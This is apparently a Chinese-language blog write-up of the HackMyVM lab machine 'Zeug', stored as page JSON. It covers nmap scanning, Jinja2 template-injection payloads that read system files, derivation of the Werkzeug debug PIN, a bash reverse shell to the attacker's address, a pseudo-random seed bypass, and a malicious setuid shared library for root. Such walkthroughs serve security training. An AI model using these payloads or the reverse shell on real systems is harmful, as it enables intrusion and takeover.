{"pageProps":{"postData":{"id":"HackMyVMZeug","contentHtml":"<h1>Zeug.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Zeug\">https://hackmyvm.eu/machines/machine.php?vm=Zeug</a></p>\n</blockquote>\n<p>Notes：<strong>Enjoy it, you can do it :D</strong></p>\n<p>该靶机有和<code>Leet</code> （<a href=\"https://hackmyvm.eu/machines/machine.php?vm=Leet%EF%BC%89%E4%B8%80%E6%A0%B7%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%8C%E7%88%86%E7%A0%B4\">https://hackmyvm.eu/machines/machine.php?vm=Leet）一样的操作，爆破</a> PIN 值，所以一块做了。</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Zeug nmap -sP 192.168.56.0/24                   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 03:59 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00062s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00042s latency).\nMAC Address: 08:00:27:4D:B4:0B (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.48\nHost is up (0.00048s latency).\nMAC Address: 08:00:27:FE:97:B0 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Zeug nmap -sT -min-rate 10000 -p- 192.168.56.48 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 04:00 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.48\nHost is up (0.00052s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n5000/tcp open  upnp\nMAC Address: 08:00:27:FE:97:B0 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 10.73 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Zeug nmap -sT -A -T4 -O -p 21,5000 192.168.56.48                                                                \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 04:00 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.48\nHost is up (0.00045s latency).                                                                                    \n                                                         \nPORT     STATE  SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             109 Jan 06  2024 README.txt\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:192.168.56.4\n|      Logged <span class=\"hljs-keyword\">in</span> as ftp\n|      TYPE: ASCII\n|      No session bandwidth <span class=\"hljs-built_in\">limit</span>\n|      Session <span class=\"hljs-built_in\">timeout</span> <span class=\"hljs-keyword\">in</span> seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status         \n5000/tcp open   upnp?       \n| fingerprint-strings:                                 \n|   GetRequest:                                                                                                   \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/3.0.1 Python/3.11.2                                                                        \n|     Date: Tue, 22 Apr 2025 08:01:06 GMT                                                                                                                                                                                           \n|     Content-Type: text/html; charset=utf-8      .....\nRunning: Linux 4.X|5.X            \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                                                   \nOS details: Linux 4.15 - 5.8                             \nNetwork Distance: 1 hop        \n                                                         \nTRACEROUTE                  \nHOP RTT     ADDRESS                                    \n1   0.45 ms 192.168.56.48                                                                                         \n                                                         \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .             \nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 101.59 seconds\n</code></pre>\n<p>看样子<code>FTP</code>运行匿名访问，并且<code>5000</code>端口是<code>Werkzeug</code></p>\n<h2>FTP</h2>\n<p>里面只有一个文件<code>README.txt</code></p>\n<pre><code class=\"hljs language-bash\">➜  Zeug <span class=\"hljs-built_in\">cat</span> README.txt        \nHi, Cosette, don<span class=\"hljs-string\">'t forget to disable the debug mode in the web application, we don'</span>t want security breaches.\n</code></pre>\n<pre><code class=\"hljs language-bash\">嗨，Cosette，不要忘记禁用 Web 应用程序中的调试模式，我们不希望出现安全漏洞。\n</code></pre>\n<p>也就是告诉我们<code>Werkzeug</code> 开启了调试模式。</p>\n<h2>Web 渗透</h2>\n<p>访问主页</p>\n<p><img src=\"/post-images/HackMyVMZeug/image.png\" alt=\"image.png\"></p>\n<p>是一个文件上传点，先测试一下。</p>\n<h3>SSTI</h3>\n<p>因为提示的是 <strong>Rendering HTML templates</strong>，只能上传<code>HTML</code>文件，并且是使用 <code>flask</code> 搭建的，所以尝试了下 <code>{{7*7}}</code></p>\n<p>结果显示存在模板注入</p>\n<p><img src=\"/post-images/HackMyVMZeug/image1.png\" alt=\"image.png\"></p>\n<p>使用 <code>curl</code> 实现</p>\n<pre><code class=\"hljs language-bash\">➜  Zeug curl -X POST <span class=\"hljs-string\">'192.168.56.48:5000'</span> -d $<span class=\"hljs-string\">'------geckoformboundary8c6d91c92627c3d7be91b3ccbedbbfde\\nContent-Disposition: form-data; name=\"file\"; filename=\"index.html\"\\n\\n{{7*7}}\\n------geckoformboundary8c6d91c92627c3d7be91b3ccbedbbfde--'</span> -H <span class=\"hljs-string\">'Content-Type: multipart/form-data; boundary=----geckoformboundary8c6d91c92627c3d7be91b3ccbedbbfde'</span>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMZeug/image2.png\" alt=\"image.png\"></p>\n<p><code>SSTImap</code> 爆破无果，还得手动</p>\n<p>手动测试后是 <code>jinja2</code></p>\n<pre><code class=\"hljs language-bash\">{{7*<span class=\"hljs-string\">'7'</span>}} <span class=\"hljs-comment\"># 77777</span>\n</code></pre>\n<p>在 <a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md\">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md</a> 中随便找找 <code>payloads</code> 最后文件读取的可以直接使用</p>\n<pre><code class=\"hljs language-bash\">{{ get_flashed_messages.__globals__.__builtins__.open(<span class=\"hljs-string\">\"/etc/passwd\"</span>).<span class=\"hljs-built_in\">read</span>() }}\n</code></pre>\n<h3><strong>Werkzeug</strong> PIN Bypass</h3>\n<p><code>/console</code> 就是 <code>Werkzeug</code> 了，需要 PIN 码，并且我们可以任意文件读取</p>\n<p>链接：<a href=\"https://github.com/wdahlenburg/werkzeug-debug-console-bypass\">https://github.com/wdahlenburg/werkzeug-debug-console-bypass</a></p>\n<blockquote>\n<p>Werkzeug has a debug console that requires a pin by default. It's possible to bypass this with an LFI vulnerability or use it as a local privilege escalation vector. The debug console will lock after 10 invalid attempts which requires the server to be restarted for another 10 guesses.</p>\n</blockquote>\n<blockquote>\n<p>Werkzeug 有一个默认需要 pin 的调试控制台。可以使用 LFI 漏洞绕过此问题，或将其用作本地权限提升向量。调试控制台将在 10 次无效尝试后锁定，这需要重新启动服务器以再进行 10 次猜测。</p>\n</blockquote>\n<ul>\n<li>根据文档，我们要得到：<code>username</code> ，<code>Flask</code> ，获取服务器托管的接口的 <code>Mac</code> 地址，Machine_id</li>\n</ul>\n<ol>\n<li>\n<p><code>username</code>：<code>www-data</code>或者<code>Cosette</code> （<code>README</code>中得到）</p>\n</li>\n<li>\n<p><code>Flask</code> 的正确路径：在错误中能看到：<code>/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py</code></p>\n</li>\n<li>\n<p>获取服务器托管的接口的 <code>Mac</code> 地址：也就是网卡的物理地址</p>\n<p>现在需要获取网卡的<code>MAC</code>地址，因为靶机系统是<code>Debian</code> ，所以配置文件在<code>/etc/network/interfaces</code></p>\n<pre><code class=\"hljs language-bash\">{{ get_flashed_messages.__globals__.__builtins__.open(<span class=\"hljs-string\">\"/etc/network/interfaces\"</span>).<span class=\"hljs-built_in\">read</span>() }}\n</code></pre>\n<p>有三张网卡</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># This file describes the network interfaces available on your system</span>\n<span class=\"hljs-comment\"># and how to activate them. For more information, see interfaces(5).</span>\n\n<span class=\"hljs-built_in\">source</span> /etc/network/interfaces.d/*\n\n<span class=\"hljs-comment\"># The loopback network interface</span>\nauto lo\niface lo inet loopback\n\n<span class=\"hljs-comment\"># The primary network interface</span>\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n\nallow-hotplug ens33\niface ens33 inet dhcp\n\nallow-hotplug enp0s8\niface enp0s8 inet dhcp\n</code></pre>\n<p>读取网卡的 <code>MAC</code> ，这里只能读到<code>enp0s3</code>的</p>\n<pre><code class=\"hljs language-bash\">{{ get_flashed_messages.__globals__.__builtins__.open(<span class=\"hljs-string\">\"/sys/class/net/enp0s3/address\"</span>).<span class=\"hljs-built_in\">read</span>() }}\n08:00:27:fe:97:b0\n</code></pre>\n<p>转换为<code>10</code>进制</p>\n<pre><code class=\"hljs language-bash\">>>> <span class=\"hljs-string\">\"\"</span>.<span class=\"hljs-built_in\">join</span>(<span class=\"hljs-string\">'08:00:27:fe:97:b0'</span>.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">\":\"</span>))\n<span class=\"hljs-string\">'080027fe97b0'</span>\n>>> <span class=\"hljs-built_in\">print</span>(0x080027fe97b0)\n8796764018608\n</code></pre>\n</li>\n<li>\n<p>Machine_id</p>\n<pre><code class=\"hljs language-bash\">{{ get_flashed_messages.__globals__.__builtins__.open(<span class=\"hljs-string\">\"/etc/machine-id\"</span>).<span class=\"hljs-built_in\">read</span>() }}\n48329e233f524ec291cce7479927890b\n</code></pre>\n<pre><code class=\"hljs language-bash\">{{ get_flashed_messages.__globals__.__builtins__.open(<span class=\"hljs-string\">\"/proc/sys/kernel/random/boot_id\"</span>).<span class=\"hljs-built_in\">read</span>() }}\n15ca1b89-3fc2-4e10-808d-ffb4abea4bdc\n</code></pre>\n<pre><code class=\"hljs language-bash\">{{ get_flashed_messages.__globals__.__builtins__.open(<span class=\"hljs-string\">\"/proc/self/cgroup\"</span>).<span class=\"hljs-built_in\">read</span>() }}\n0::/system.slice/zeug-app.service\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"48329e233f524ec291cce7479927890b\"</span> > machine-id                               \n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"15ca1b89-3fc2-4e10-808d-ffb4abea4bdc\"</span> > boot_id                                   \n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"0::/system.slice/zeug-app.service\"</span> > cgroup \n</code></pre>\n<pre><code class=\"hljs language-bash\">machine_id = b<span class=\"hljs-string\">\"\"</span>\n<span class=\"hljs-keyword\">for</span> filename <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"machine-id\"</span>, <span class=\"hljs-string\">\"boot_id\"</span>:\n    try:\n        with open(filename, <span class=\"hljs-string\">\"rb\"</span>) as f:\n            value = f.readline().strip()\n    except OSError:\n        <span class=\"hljs-built_in\">continue</span>\n\n    <span class=\"hljs-keyword\">if</span> value:\n        machine_id += value\n        <span class=\"hljs-built_in\">break</span>\ntry:\n    with open(<span class=\"hljs-string\">\"cgroup\"</span>, <span class=\"hljs-string\">\"rb\"</span>) as f:\n        machine_id += f.readline().strip().rpartition(b<span class=\"hljs-string\">\"/\"</span>)[2]\nexcept OSError:\n    pass\n\n<span class=\"hljs-built_in\">print</span>(machine_id)\n</code></pre>\n<pre><code class=\"hljs language-bash\">python getID.py \nb<span class=\"hljs-string\">'48329e233f524ec291cce7479927890bzeug-app.service'</span>\n</code></pre>\n</li>\n<li>\n<p>通过链接中的脚本获得 <code>PIN</code></p>\n<pre><code class=\"hljs language-bash\">python werkzeug-pin-bypass.py \nPin: 690-793-473\n</code></pre>\n</li>\n</ol>\n<h3><strong>Werkzeug console 利用</strong></h3>\n<p>输入 PIN 后，可以进行反弹 <code>shell</code> 了</p>\n<pre><code class=\"hljs language-bash\">import os;os.system(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.56.4/1234 0>&#x26;1'\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Zeug nc -lvp 1234\nlistening on [any] 1234 ...\n192.168.56.48: inverse host lookup failed: Unknown host\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.48] 44856\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (471): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\ncosette@zeug:~/zeug$ \n</code></pre>\n<h2>提权 - to exia</h2>\n<p>查看权限</p>\n<pre><code class=\"hljs language-bash\">cosette@zeug:~$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> cosette on zeug:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser cosette may run the following commands on zeug:\n    (exia) NOPASSWD: /home/exia/seed\n</code></pre>\n<p>可以以<code>exia</code>权限执行<code>/home/exia/seed</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> -u exia /home/exia/seed\n</code></pre>\n<p>运行试试</p>\n<pre><code class=\"hljs language-bash\">cosette@zeug:~$ <span class=\"hljs-built_in\">sudo</span> -u exia /home/exia/seed\n<span class=\"hljs-built_in\">sudo</span> -u exia /home/exia/seed\n1\n********************************************\n* Hi, Cosette, it<span class=\"hljs-string\">'s time to plant the seed *\n********************************************\nEnter a number: Wrong.\n</span></code></pre>\n<h3>伪随机脚本</h3>\n<p>加目录下还有<code>seed_bak</code> 拿出来分析分析，简单的伪随机数生成脚本</p>\n<p><img src=\"/post-images/HackMyVMZeug/image3.png\" alt=\"image.png\"></p>\n<p>写一个脚本计算出来</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\">#include &#x3C;stdio.h></span>\n<span class=\"hljs-comment\">#include &#x3C;stdlib.h></span>\n\nint <span class=\"hljs-function\"><span class=\"hljs-title\">main</span></span>()\n{\n    int v5;\n    srand(1u);\n    v5 = rand();\n    int v6 = -559038737;\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"%d\\n\"</span>, v5 ^ v6);\n    <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<pre><code class=\"hljs language-bash\">-1255736440\n</code></pre>\n<pre><code class=\"hljs language-bash\">cosette@zeug:~$ <span class=\"hljs-built_in\">sudo</span> -u exia /home/exia/seed\n<span class=\"hljs-built_in\">sudo</span> -u exia /home/exia/seed\n-1255736440\n\n<span class=\"hljs-built_in\">id</span>\nuid=1002(exia) gid=1002(exia) <span class=\"hljs-built_in\">groups</span>=1002(exia)\n</code></pre>\n<h2>提权 - to root</h2>\n<h3>动态链接库提权</h3>\n<p><code>exia</code> 家目录得到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> user.txt\nHMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}\n</code></pre>\n<p>查看权限</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> exia on zeug:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser exia may run the following commands on zeug:\n    (root) NOPASSWD: /usr/bin/zeug\n</code></pre>\n<pre><code class=\"hljs language-bash\">exia@zeug:/usr/bin$ <span class=\"hljs-built_in\">sudo</span> zeug\nError opening file\nexia@zeug:/usr/bin$ <span class=\"hljs-built_in\">sudo</span> zeug /etc/passwd\nError opening file\n</code></pre>\n<p>拉出来分析</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  <span class=\"hljs-keyword\">if</span> ( dlopen(<span class=\"hljs-string\">\"/home/exia/exia.so\"</span>, 2) )\n    <span class=\"hljs-built_in\">return</span> 0;\n  fwrite(<span class=\"hljs-string\">\"Error opening file\\n\"</span>, 1uLL, 0x13uLL, _bss_start);\n  <span class=\"hljs-built_in\">return</span> 1;\n}\n</code></pre>\n<p>这段代码的主要目的是尝试加载一个共享库（<code>exia.so</code>），如果加载失败，则通过 <code>fwrite</code> 输出错误信息到某个内存地址，并返回 <code>1</code>。它可以通过 <code>dlerror()</code> 提供更详细的错误信息来改善错误处理。</p>\n<p>并且动态链接库<code>exia.so</code>是我们可以控制的，直接编写一个恶意链接库即可</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\">#include &#x3C;stdio.h></span>\n<span class=\"hljs-comment\">#include &#x3C;stdlib.h></span>\n<span class=\"hljs-comment\">#include &#x3C;unistd.h></span>\n\nvoid __attribute__((constructor)) <span class=\"hljs-function\"><span class=\"hljs-title\">setup</span></span>() {\n    // 提权操作，设置用户ID为0（root）\n    <span class=\"hljs-keyword\">if</span> (setuid(0) == -1) {\n        perror(<span class=\"hljs-string\">\"setuid failed\"</span>);\n        <span class=\"hljs-built_in\">exit</span>(1);\n    }\n\n    // 执行提权后，显示成功信息\n    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Privilege Escalation Successful\\n\"</span>);\n    system(<span class=\"hljs-string\">\"/bin/bash\"</span>);  // 启动一个 shell，可以使用该 shell 提升权限\n}\n</code></pre>\n<pre><code class=\"hljs language-bash\">gcc -shared -fPIC -o /home/exia/exia.so exia.c\n</code></pre>\n<pre><code class=\"hljs language-bash\">exia@zeug:~$ <span class=\"hljs-built_in\">sudo</span> zeug\nPrivilege Escalation Successful\n</code></pre>\n<pre><code class=\"hljs language-bash\">root@zeug:~# <span class=\"hljs-built_in\">cat</span> root.txt \nHMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}\n</code></pre>","title":"HackMyVM - Zeug","date":"2025-04-22","updated":"2025-04-22","comments":true,"tags":["Linux靶机","HackMyVM","Werkzeug"],"categories":"靶机","description":"Zeug.\n\n https://hackmyvm.eu/machines/machine.php?vm=Zeug\n \n\nNotes：Enjoy it, you can do it :D\n\n该靶机有和`Leet` （https://hackmyvm.eu/machines/machine.php?vm=Leet）一样的操作，爆破 PIN 值，所以一块做了。\n\n前期踩点\n\n\n\n\n\n\n\n看样子`FTP`..."},"recentPosts":[{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"}]},"__N_SSG":true}